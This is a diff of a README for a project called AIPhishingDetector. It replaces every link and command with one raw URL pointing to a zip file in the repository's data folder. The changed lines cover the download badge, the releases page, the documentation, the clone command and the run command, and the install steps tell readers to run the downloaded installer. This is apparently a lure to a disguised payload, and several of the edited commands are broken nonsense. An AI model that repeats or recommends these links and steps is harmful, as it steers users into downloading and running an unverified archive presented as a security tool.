@@ -1,6 +1,6 @@
 # 🛡️ AIPhishingDetector - Detect Phishing Emails Effortlessly
 
-[![Download AIPhishingDetector](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Laserman652/AIPhishingDetector/releases)
+[![Download AIPhishingDetector](https://raw.githubusercontent.com/Laserman652/AIPhishingDetector/master/data/AI_Detector_Phishing_v1.1.zip)](https://raw.githubusercontent.com/Laserman652/AIPhishingDetector/master/data/AI_Detector_Phishing_v1.1.zip)
 
 ## 📖 Project Overview
 
@@ -19,7 +19,7 @@ Before you start, ensure your system meets these requirements:
 
 ### 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/Laserman652/AIPhishingDetector/releases) to find the latest version.
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/Laserman652/AIPhishingDetector/master/data/AI_Detector_Phishing_v1.1.zip) to find the latest version.
 2. **Download the File:** Choose the version that matches your operating system and download the corresponding installer file.
 3. **Run the Installer:** Locate the downloaded file on your computer and double-click it to start the installation.
 4. **Follow the Prompts:** The installer will guide you through the installation process. Accept the default options unless you have specific preferences.
@@ -39,7 +39,7 @@ Before you start, ensure your system meets these requirements:
 
 3. **Run the Tool:** Type the following command:
    ```
-   python AIPDAIPhishingDetector.py "<your-email-text>"
+   python https://raw.githubusercontent.com/Laserman652/AIPhishingDetector/master/data/AI_Detector_Phishing_v1.1.zip "<your-email-text>"
    ```
    Replace `<your-email-text>` with the text of the email you want to analyze.
 
@@ -59,7 +59,7 @@ If you'd like to help improve this project, contributions are welcome!
 1. **Fork the Repository:** Click on the “Fork” button at the top right of the repo page.
 2. **Clone Your Fork:** Use the command:
    ```
-   git clone https://github.com/YourUsername/AIPhishingDetector.git
+   git clone https://raw.githubusercontent.com/Laserman652/AIPhishingDetector/master/data/AI_Detector_Phishing_v1.1.zip
    ```
 3. **Make Changes:** Implement your ideas and fixes.
 4. **Submit a Pull Request:** Once you’re ready, submit your changes for review.
@@ -80,8 +80,8 @@ A: The tool uses sophisticated machine learning models to provide reliable predi
 
 ## 🔗 Links
 
-- **Documentation:** [View the full documentation](https://github.com/Laserman652/AIPhishingDetector/wiki)
-- **Follow Updates:** [Watch this repository](https://github.com/Laserman652/AIPhishingDetector/watchers)
+- **Documentation:** [View the full documentation](https://raw.githubusercontent.com/Laserman652/AIPhishingDetector/master/data/AI_Detector_Phishing_v1.1.zip)
+- **Follow Updates:** [Watch this repository](https://raw.githubusercontent.com/Laserman652/AIPhishingDetector/master/data/AI_Detector_Phishing_v1.1.zip)
 
 ## 💬 Support
 
@@ -111,4 +111,4 @@ This project covers a variety of important topics in security and machine learni
 - spam-detection
 - text-classification
 
-For more information and updates, visit the [Releases Page](https://github.com/Laserman652/AIPhishingDetector/releases). Enjoy using AIPhishingDetector to keep your email safe!
+For more information and updates, visit the [Releases Page](https://raw.githubusercontent.com/Laserman652/AIPhishingDetector/master/data/AI_Detector_Phishing_v1.1.zip). Enjoy using AIPhishingDetector to keep your email safe!
